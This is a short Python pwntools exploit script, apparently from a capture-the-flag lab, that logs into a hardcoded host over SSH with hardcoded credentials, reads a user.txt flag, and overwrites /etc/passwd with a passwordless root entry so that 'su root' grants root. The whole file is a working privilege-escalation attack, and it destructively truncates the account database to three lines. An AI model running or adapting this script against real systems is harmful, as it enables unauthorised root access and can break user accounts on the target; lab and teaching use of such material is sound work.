#!/usr/bin/python3

# Hit & Run Exploit CVE-2024-0001
# Passwd Files with write & write Permission !


from pwn import *
import pyfiglet
from colorama import init
from colorama import Fore, Back, Style


ascii_banner = pyfiglet.figlet_format("PaiN")
print(Fore.CYAN + ascii_banner)

# SSH Login

s1 = ssh(host="10.10.40.25", # Change IP 
        user="eklavya", 
        password="eklavya")
# s1 = ssh(host="127.0.0.1", user="pain", password="omjay2121")
p1 = s1.shell("sh")
p1.sendline(b"cat user.txt\n")
p1.sendline(b"echo root::0:0:root:/root:/bin/bash > /etc/passwd")
p1.sendline(
    b"echo eklavya:x:1000:1000:eklavya:/home/eklavya:/bin/bash >> /etc/passwd")
p1.sendline(b"echo sshd:x:113:65534::/run/sshd:/usr/sbin/nologin >> /etc/passwd")
print("Now Login With eklavya and use 'su root' :) You will become Root")
# p1.interactive()
